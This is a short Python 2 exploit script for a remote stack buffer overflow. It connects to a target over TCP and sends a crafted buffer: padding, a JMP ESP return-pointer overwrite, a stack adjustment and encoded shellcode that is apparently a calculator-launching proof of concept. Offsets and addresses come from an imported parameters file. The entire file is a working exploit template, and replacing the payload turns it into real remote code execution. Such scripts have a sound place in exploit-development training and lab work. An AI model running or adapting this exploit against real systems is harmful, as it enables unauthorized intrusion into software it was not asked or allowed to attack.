#!/usr/bin/env python2
import socket
import struct

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, ptr_jmp_esp, sub_esp_10

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

#ptr_jmp_esp = 0x080414C3

#sub_esp_10 = "\x83\xec\x10"
#or padding = "\x90" * 16
shellcode_calc =  b""
shellcode_calc += b"\xda\xc6\xd9\x74\x24\xf4\x5e\x31\xc9"
shellcode_calc += b"\xbf\x60\x64\x3e\x98\xb1\x31\x83\xc6"
shellcode_calc += b"\x04\x31\x7e\x14\x03\x7e\x74\x86\xcb"
shellcode_calc += b"\x64\x9c\xc4\x34\x95\x5c\xa9\xbd\x70"
shellcode_calc += b"\x6d\xe9\xda\xf1\xdd\xd9\xa9\x54\xd1"
shellcode_calc += b"\x92\xfc\x4c\x62\xd6\x28\x62\xc3\x5d"
shellcode_calc += b"\x0f\x4d\xd4\xce\x73\xcc\x56\x0d\xa0"
shellcode_calc += b"\x2e\x67\xde\xb5\x2f\xa0\x03\x37\x7d"
shellcode_calc += b"\x79\x4f\xea\x92\x0e\x05\x37\x18\x5c"
shellcode_calc += b"\x8b\x3f\xfd\x14\xaa\x6e\x50\x2f\xf5"
shellcode_calc += b"\xb0\x52\xfc\x8d\xf8\x4c\xe1\xa8\xb3"
shellcode_calc += b"\xe7\xd1\x47\x42\x2e\x28\xa7\xe9\x0f"
shellcode_calc += b"\x85\x5a\xf3\x48\x21\x85\x86\xa0\x52"
shellcode_calc += b"\x38\x91\x76\x29\xe6\x14\x6d\x89\x6d"
shellcode_calc += b"\x8e\x49\x28\xa1\x49\x19\x26\x0e\x1d"
shellcode_calc += b"\x45\x2a\x91\xf2\xfd\x56\x1a\xf5\xd1"
shellcode_calc += b"\xdf\x58\xd2\xf5\x84\x3b\x7b\xaf\x60"
shellcode_calc += b"\xed\x84\xaf\xcb\x52\x21\xbb\xe1\x87"
shellcode_calc += b"\x58\xe6\x6f\x59\xee\x9c\xdd\x59\xf0"
shellcode_calc += b"\x9e\x71\x32\xc1\x15\x1e\x45\xde\xff"
shellcode_calc += b"\x5b\xa9\x3c\x2a\x91\x42\x99\xbf\x18"
shellcode_calc += b"\x0f\x1a\x6a\x5e\x36\x99\x9f\x1e\xcd"
shellcode_calc += b"\x81\xd5\x1b\x89\x05\x05\x51\x82\xe3"
shellcode_calc += b"\x29\xc6\xa3\x21\x4a\x89\x37\xa9\xa3"
shellcode_calc += b"\x2c\xb0\x48\xbc"


buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += struct.pack("<I", ptr_jmp_esp) # SRP overwrite
buf += sub_esp_10 # ESP points here
buf += shellcode_calc
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send(buf)
